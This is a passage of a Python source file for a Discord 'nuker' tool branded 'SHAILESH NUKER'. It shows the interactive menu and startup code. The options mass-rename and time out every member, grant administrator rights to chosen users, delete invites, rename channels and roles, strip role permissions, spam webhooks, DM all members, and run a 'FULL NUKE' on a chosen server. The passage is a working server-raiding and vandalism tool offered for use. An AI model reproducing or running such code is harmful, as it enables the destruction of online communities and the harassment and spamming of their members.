            await asyncio.sleep(1)
            await self.menu()

        elif ans == "10":
            new_nick = await self.async_input(format_log_message("INFO", "New nickname", 50))
            new_nick = new_nick.strip()
            if not new_nick:
                print(format_log_message("ERROR", "Nickname cannot be empty!", 37))
                await self.menu()
                return
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            start_time = time.time()
            tasks = [self.execute_nick_all(member, new_nick, token) for member in members]
            results = await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            success_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Attempted to nick {len(members)} members, succeeded {success_count} in ({duration:.2f}s)", 35))
            await asyncio.sleep(1)
            await self.menu()

        elif ans == "11":
            start_time = time.time()
            success = await self.execute_change_icon(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change icon completed in ({duration:.2f}s)", 38))
            else:
                print(format_log_message("INFO", f"Change icon process finished in ({duration:.2f}s)", 36))
            await asyncio.sleep(1)
            await self.menu()

        elif ans == "12":
            start_time = time.time()
            success = await self.execute_change_guild_info(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change guild info completed in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Change guild info process finished in ({duration:.2f}s)", 33))
            await asyncio.sleep(1)
            await self.menu()

        elif ans == "13":
            success_count, duration = await self.execute_give_admin(token)
            if duration > 0:
                print(format_log_message("SUCCESS", f"Assigned admin to {success_count} users in ({duration:.2f}s)", 36))
            else:
                print(format_log_message("INFO", f"Assign admin process finished in ({duration:.2f}s)", 34))
            await asyncio.sleep(1)
            await self.menu()

        elif ans == "14":
            deleted_count, duration, total_invites = await self.execute_delete_invites(token)
            if duration > 0 or total_invites > 0:
                print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_invites} invites in ({duration:.2f}s)", 44))
            else:
                print(format_log_message("INFO", f"Delete invites process finished in ({duration:.2f}s)", 42))
            await asyncio.sleep(1)
            await self.menu()

        elif ans == "15":
            print(format_log_message("INFO", "Switching guild...", 45))
            guildid = await self.async_input(format_log_message("INFO", "Enter new Guild ID", 50))
            guildid = guildid.strip()
            os.system("cls") if os.name == "nt" else os.system("clear")
            await shakti(guildid, self.client).menu()
            os._exit(0)

        elif ans == "16":
            print(format_log_message("INFO", "Select Timeout Duration:", 50))
            print(gradient_text("╭" + "─" * 80 + "╮", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [1] 1 Day                                                                      │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [2] 1 Week                                                                     │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [3] 28 Days (Max)                                                              │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 80 + "╯", PINK_START, PINK_END, bold=True))
            
            duration_choice = await self.async_input(format_log_message("INFO", "Choose duration (1-3)", 50))
            duration_map = {
                "1": 86400,    
                "2": 604800,   
                "3": 2419200   
            }
            
            duration_seconds = duration_map.get(duration_choice.strip())
            
            if not duration_seconds:
                print(format_log_message("ERROR", f"Invalid choice: {gradient_text(duration_choice, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return
            
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return

            start_time = time.time()
            tasks = [self.execute_timeout_all(member, duration_seconds, token) for member in members]
            results = await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            success_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Attempted to timeout {len(members)} members, succeeded {success_count} in ({duration:.2f}s)", 35))
            await asyncio.sleep(1)
            await self.menu()

        elif ans == "17":
            count = await self.execute_rename_channels(token)
            print(format_log_message("SUCCESS", f"Renamed {count} channels", 40))
        elif ans == "18":
            count = await self.execute_rename_roles(token)
            print(format_log_message("SUCCESS", f"Renamed {count} roles", 40))
        elif ans == "19":
            count = await self.execute_webhook_spam(token)
            print(format_log_message("SUCCESS", f"Sent {count} webhook messages", 40))
        elif ans == "20":
            count = await self.execute_dm_all(token)
            print(format_log_message("SUCCESS", f"DM'd {count} members", 40))
        elif ans == "21":
            count = await self.execute_strip_perms(token)
            print(format_log_message("SUCCESS", f"Stripped perms from {count} roles", 40))
        elif ans == "22":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs for admin (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                success_count = 0
                for user_id in user_ids:
                    success = await self.execute_auto_admin(token, user_id)
                    if success:
                        success_count += 1
                print(format_log_message("SUCCESS", f"Admin granted to {success_count}/{len(user_ids)} users", 40))
            else:
                print(format_log_message("ERROR", "No user IDs provided", 40))
        elif ans == "23":
            await self.execute_clone_server(token)
            print(format_log_message("SUCCESS", "Server cloned!", 40))
        elif ans == "24":
            await self.execute_nuke_all(token)
            print(format_log_message("SUCCESS", "FULL NUKE COMPLETE", 40))
        elif ans == "25":
            await self.execute_get_invite(token)
        elif ans == "26":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to whitelist (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                print(format_log_message("SUCCESS", f"Adding {len(user_ids)} user(s) to whitelist...", 45))
                for user_id in user_ids:
                    result = await self.add_to_whitelist(user_id)
                    if result:
                        print(format_log_message("SUCCESS", f"Added user #{user_id} to whitelist", 48))
            else:
                print(format_log_message("ERROR", "No valid user IDs provided", 50))
            await asyncio.sleep(3)
            await self.menu()
        
        elif ans == "27":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to unwhitelist (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                print(format_log_message("SUCCESS", f"Removing {len(user_ids)} user(s) from whitelist...", 45))
                for user_id in user_ids:
                    result = await self.remove_from_whitelist(user_id)
                    if result:
                        print(format_log_message("SUCCESS", f"Removed user #{user_id} from whitelist", 48))
            else:
                print(format_log_message("ERROR", "No valid user IDs provided", 50))
            await asyncio.sleep(3)
            await self.menu()

        elif ans == "28":
            if len(__loaded_configs__) < 2:
                print(format_log_message("ERROR", "Only one config loaded. Load multiple configs at startup.", 32))
                await asyncio.sleep(3)
                await self.menu()
                return
            
            print(format_log_message("INFO", "Available Configs to Switch:", 50))
            print(gradient_text("╭" + "─" * 80 + "╮", PINK_START, PINK_END, bold=True))
            config_names = list(__loaded_configs__.keys())
            for i, config_name in enumerate(config_names, 1):
                marker = "✓ ACTIVE" if config_name == __current_config_name__ else "         "
                bot_info = __loaded_configs__[config_name].get("token", "N/A")[:15] + "..."
                print(gradient_text(f"│ {i:<2} │ {config_name:<30} {marker} │ Bot: {bot_info:<20} │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 80 + "╯", PINK_START, PINK_END, bold=True))
            
            try:
                choice = int(await self.async_input(format_log_message("INFO", "Choose config number", 50)).strip()) - 1
                if 0 <= choice < len(config_names):
                    selected_config = config_names[choice]
                    if switch_config(selected_config):
                        print(format_log_message("SUCCESS", f"Switched to {gradient_text(selected_config, GREEN_START, GREEN_END, bold=True)}", 45))
                        print(format_log_message("INFO", "Note: Restart required for new bot token to take effect", 30))
                    else:
                        print(format_log_message("ERROR", "Failed to switch config", 48))
                else:
                    print(format_log_message("ERROR", "Invalid choice!", 49))
            except ValueError:
                print(format_log_message("ERROR", "Invalid input! Please enter a number.", 33))
            await asyncio.sleep(3)
            await self.menu()

        elif ans == "29":
            await self.execute_guild_info(token)
        elif ans == "30":
            client_id = self.client.user.id
            invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot%20applications.commands"
            
            platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows (copy) / [m]obile (print)", 50))
            platform = platform.strip().lower()
            
            if platform.startswith('w'):
                try:
                    pyperclip.copy(invite_link)
                    print(format_log_message("SUCCESS", "Bot invite link copied to clipboard.", 50))
                    print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
                except Exception as e:
                    print(format_log_message("ERROR", f"Could not copy to clipboard: {e}", 40))
                    print(format_log_message("INFO", f"Here is the link instead: {invite_link}", 50))
            elif platform.startswith('m'):
                print(format_log_message("SUCCESS", "Bot invite link:", 50))
                print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
            else:
                print(format_log_message("INFO", "Invalid choice. Printing link.", 40))
                print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
            
            await asyncio.sleep(1)
            await self.menu()
        elif ans == "31":
            await self.execute_check_admin(token)
            await self.async_input(format_log_message("INFO", "Press Enter to return to Menu [B]", 50))
        elif ans == "32":
            print(format_log_message("SUCCESS", "Exiting...", 50))
            os._exit(0)
        else:
            print(format_log_message("ERROR", f"Invalid option: {gradient_text(ans, PINK_START, PINK_END, bold=True)}!", 47))            

        await asyncio.sleep(1)
        await self.menu()

bot_instance = None
@__client__.event
async def on_ready():
    global bot_instance
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("SUCCESS", f"Authenticated: {__client__.user.name}#{__client__.user.discriminator}", 24))
        System.Title(f"SHAILESH NUKER - {__client__.user}")
        print(f" \033[32m[+] Connected as {__client__.user} \033[0m")


        guildid = ""
        fetch_guilds_choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Fetch and list available guilds? [y/n]", 50)))
        fetch_guilds_choice = fetch_guilds_choice.strip().lower()

        if fetch_guilds_choice == 'y' and __client__.guilds:
            print(format_log_message("INFO", "Available Guilds:", 35))
            print(gradient_text("╭" + "─" * 80 + "╮", PINK_START, PINK_END, bold=True))
            for i, guild in enumerate(__client__.guilds):
                print(gradient_text(f"│ {i+1:>3} │ {guild.name[:35]:<35} │ ID: {guild.id:<30} │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 80 + "╯", PINK_START, PINK_END, bold=True))
            
            try:
                choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Choose guild number (or Enter for manual ID)", 50)))
                choice = choice.strip()
                if choice:
                    idx = int(choice) - 1
                    if 0 <= idx < len(__client__.guilds):
                        selected_guild = __client__.guilds[idx]
                        guildid = str(selected_guild.id)
                        print(format_log_message("SUCCESS", f"Selected: {gradient_text(selected_guild.name, PINK_START, PINK_END, bold=True)}", 43))
                        
                        # Added Invite Option
                        print(format_log_message("INFO", "Choose Action:", 50))
                        print(gradient_text("╭" + "─" * 80 + "╮", PINK_START, PINK_END, bold=True))
                        print(gradient_text("│ [1] Proceed to Nuke Menu                                                       │", PINK_START, PINK_END, bold=True))
                        print(gradient_text("│ [2] Get Invite Link & Join Server                                              │", PINK_START, PINK_END, bold=True))
                        print(gradient_text("│ [3] Check Admin Status                                                         │", PINK_START, PINK_END, bold=True))
                        print(gradient_text("╰" + "─" * 80 + "╯", PINK_START, PINK_END, bold=True))
                        
                        action = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Choice", 50)))
                        action = action.strip()
                        if action == "3":
                            me = selected_guild.me
                            if me.guild_permissions.administrator:
                                print(format_log_message("SUCCESS", "Bot HAS Administrative Permissions!", 45))
                            else:
                                print(format_log_message("ERROR", "Bot DOES NOT have Administrative Permissions!", 45))
                            await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Press Enter to go Back...", 50)))
                        
                        if action == "2":
                            print(format_log_message("INFO", "Generating invite link...", 40))
                            invite_link = None
                            for channel in selected_guild.text_channels:
                                try:
                                    invite = await channel.create_invite(max_age=0)
                                    invite_link = f"https://discord.gg/{invite.code}"
                                    break
                                except:
                                    continue
                            
                            if invite_link:
                                print(format_log_message("SUCCESS", f"Invite Link: {invite_link}", 50))
                                print(format_log_message("INFO", "Redirecting to Discord...", 40))
                                webbrowser.open(invite_link)
                                await asyncio.sleep(2)
                            else:
                                print(format_log_message("ERROR", "Could not generate invite link (No Permissions).", 40))
                    else:
                        raise ValueError
                else:
                    guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID manually", 50)))
                    guildid = guildid.strip()
            except (ValueError, IndexError):
                print(format_log_message("ERROR", "Invalid choice. Falling back to manual ID input.", 28))
                guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
                guildid = guildid.strip()
        else:
            if fetch_guilds_choice == 'y':
                print(format_log_message("ERROR", "No guilds found! Proceeding to manual ID input.", 28))
            else:
                print(format_log_message("INFO", "Skipping guild list.", 40))
            guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
            guildid = guildid.strip()

        if not guildid:
            print(format_log_message("ERROR", "No guild ID provided! Exiting.", 32))
            os._exit(1)

        guild_obj = __client__.get_guild(int(guildid))
        if guild_obj:
            print(format_log_message("SUCCESS", f"Server Selected: {gradient_text(guild_obj.name, PINK_START, PINK_END, bold=True)}", 43))
        else:
            print(format_log_message("WARNING", "Guild not found in cache. Proceeding...", 43))

        bot_instance = shakti(guildid, __client__)
        print(format_log_message("INFO", "Use option 26 to grant admin to specific user IDs.", 40))
        await bot_instance.menu()
    except KeyboardInterrupt:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("INFO", "Closing WIZZLER... Goodbye!", 40))
        await asyncio.sleep(0.5)
        exit(0)
        
if __name__ == "__main__":
     try:
        if os.name == "nt":
            os.system(f"title SHAILESH NUKER")
        __client__.run(token)
     except KeyboardInterrupt:
        print(format_log_message("INFO", "Closing WIZZLER... Goodbye!", 40))
        os._exit(0)
     except Exception as e:
        print(format_log_message("ERROR", f"Failed to start | {e}", 47))
        os._exit(1)